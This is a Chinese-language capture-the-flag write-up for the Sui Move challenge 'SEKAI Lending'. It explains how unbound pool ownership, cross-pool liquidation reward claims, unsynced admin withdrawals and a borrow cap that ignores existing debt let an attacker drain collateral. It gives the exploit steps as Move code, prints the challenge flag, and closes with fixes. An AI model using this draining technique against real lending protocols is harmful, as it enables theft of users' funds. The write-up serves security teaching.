# SEKAI Lending

## 题目简述

题目运行在 Sui Move 环境。初始 `Challenge` 中的主借贷池各持有 100 枚抵押币和 100 枚 SEKAI Coin，玩家只能领取 10 枚抵押币；通关却要求向挑战合约捐回：

$$
100\ \text{COLLATERAL}
\quad\text{和}\quad
80\ \text{SEKAI}.
$$

协议的漏洞不是单一算术错误，而是多个对象边界没有绑定：

- `sekai_lending::create()` 是公开函数，创建者会成为新池的管理员；
- `UserPosition` 不记录所属借贷池；
- `claim_liquidation_reward()` 接受任意 `UserPosition`，并直接从调用它的池中支付奖励；
- 管理员移除池中抵押物时，不同步仓位和全局记账；
- `borrow_coin()` 只检查“本次借款额”，没有把仓位已有债务计入上限。

官方 `solution.move` 利用自建池伪造清算奖励，再把奖励拿到题目主池兑现，循环抽走足够的抵押币。

## 解题过程

### 1. 准备主池仓位和自建池流动性

两种代币精度分别为：

```move
const SEKAI: u64 = 100000000;
const COLLATERAL: u64 = 1000000000;
```

先领取 10 枚抵押币，将其全部存入主池仓位并借出 8 枚 SEKAI：

```move
let claim = challenge::claim(challenge, ctx);
let mut position1 = sekai_lending.open_position(ctx);
sekai_lending.deposit_collateral(&mut position1, claim, ctx);
let mut sekai_coin =
    sekai_lending.borrow_coin(&mut position1, 8 * SEKAI, ctx);
```

把其中 4 枚归还，仓位变为“10 枚抵押、4 枚债务”；再提走 5 枚抵押，仓位仍恰好满足 80% LTV。剩余 4 枚 SEKAI 用作攻击者自建池的循环流动性：

```move
let sekai_coin_half = coin::split(&mut sekai_coin, 4 * SEKAI, ctx);
sekai_lending.repay_loan(sekai_coin_half, &mut position1, ctx);
let collateral =
    sekai_lending.withdraw_collateral(5 * COLLATERAL, &mut position1, ctx);

let mut fake_pool = sekai_lending::create(
    coin::zero<COLLATERAL_COIN>(ctx),
    coin::zero<SEKAI_COIN>(ctx),
    ctx,
);
fake_pool.add_liquidity(sekai_coin, ctx);
```

自建池的 `admin` 是玩家，因此玩家可以任意调用 `remove_collateral()` 和 `remove_liquidity()`。

### 2. 在自建池制造可清算仓位

每轮拿 5 枚抵押币，在自建池中新开仓位并借 3.2 枚 SEKAI：

```move
fake_pool.deposit_collateral(&mut position2, collateral_5, ctx);
let repayment =
    fake_pool.borrow_coin(&mut position2, 320_000_000, ctx);
```

此时仓位本身的 LTV 为 64%，正常情况下不应被清算。玩家作为自建池管理员，先直接移走池中的 4 枚抵押币：

```move
let collateral_4 =
    fake_pool.remove_collateral(4 * COLLATERAL, ctx);
```

`remove_collateral()` 只减少真实 `collateral_pool`，没有修改 `position2.collateral_amount` 或 `total_collateral`。于是：

```text
仓位账面抵押 = 5
池中真实抵押 = 1
池中总借款   = 3.2
```

清算函数还接受“协议整体 LTV 超过 85%”作为条件：

$$
\operatorname{protocolLTV}
=\frac{3.2}{1}\times100\%
=320\%.
$$

因此把刚借出的 3.2 枚 SEKAI 原样归还，就能清算自己的仓位。清算把 3.2 枚重新放回池中，4 枚 SEKAI 流动性可以在下一轮继续复用；仓位则记录：

$$
\operatorname{reward}
=5\times(1-10\%)
=4.5\ \text{COLLATERAL}.
$$

### 3. 跨池领取奖励

真正的抽取点在下面这个接口：

```move
public fun claim_liquidation_reward(
    self: &mut SEKAI_LENDING,
    position: &mut UserPosition,
    ctx: &mut TxContext
): Coin<COLLATERAL_COIN>
```

函数只读取 `position.liquidation_reward`，没有验证该仓位是否由 `self` 创建或清算。于是 `position2` 虽然在自建池中生成奖励，却可以传给主池：

```move
let reward =
    sekai_lending.claim_liquidation_reward(&mut position2, ctx);
```

主池会实际支付 4.5 枚抵押币。与此同时，玩家作为自建池管理员还能取回此前留在自建池中的 1 枚抵押币；连同已经取出的 4 枚，每轮用于造仓的 5 枚本金全部回收，净增加 4.5 枚主池抵押物：

```text
投入自建池 5
→ 管理员取回 4 + 1
→ 主池另付清算奖励 4.5
→ 每轮净增 4.5
```

官方解法先循环 22 次，累计得到足够抵押币，再把其中 90 枚存回主池仓位。

### 4. 借出 80 枚 SEKAI 并完成捐赠

主仓位原有 4 枚债务。存入 90 枚后，账面抵押达到 95 枚。`borrow_coin()` 的上限检查为：

```move
assert!(borrow_amount <= max_borrow, EInsufficientCollateral);
position.borrowed_amount = position.borrowed_amount + borrow_amount;
```

它没有检查：

```move
position.borrowed_amount + borrow_amount <= max_borrow
```

因此官方解法可以再借 76 枚，使实际总债务达到 80 枚。随后继续执行 21 轮跨池领奖，凑出 100 枚可捐赠抵押币；最后从自建池取回最初的 4 枚 SEKAI 流动性：

```move
sekai_coin.join(fake_pool.remove_liquidity(4 * SEKAI, ctx));

challenge.donate_collateral(collateral_100);
challenge.donate_sekai(sekai_coin_80);
challenge.is_solved();
```

仓库的正式 `challenge/docker-compose.yml` 给出了部署所用 flag：

```text
SEKAI{fun-lending-service-zzlol}
```

`dist/docker-compose.yml` 中的 `SEKAI{}` 只是发布包占位值，不能与正式挑战配置混淆。

## 方法总结

本题的核心是“仓位属于哪个池”没有成为类型或状态不变量。攻击者在自己控制的池中制造 4.5 枚清算奖励，却让题目主池承担支付；管理员提款不更新账面状态，又为自我清算提供了条件。

安全实现至少需要：

- 在 `UserPosition` 中绑定池对象 ID，并在所有接口验证归属；
- 清算奖励由产生它的池托管，不能凭外部仓位对象从任意池领取；
- 管理员提款同步全部会计状态，且不能破坏未结仓位的偿付能力；
- 借款上限检查仓位的累计债务，而非只检查本次增量；
- 对公开工厂创建的池与挑战主池使用不同的权限或能力类型。

Move 的资源类型能阻止复制和丢弃，却不会自动表达跨对象归属。若接口只要求 `&mut UserPosition` 和 `&mut Pool`，开发者仍必须显式保证这两个资源来自同一业务域。
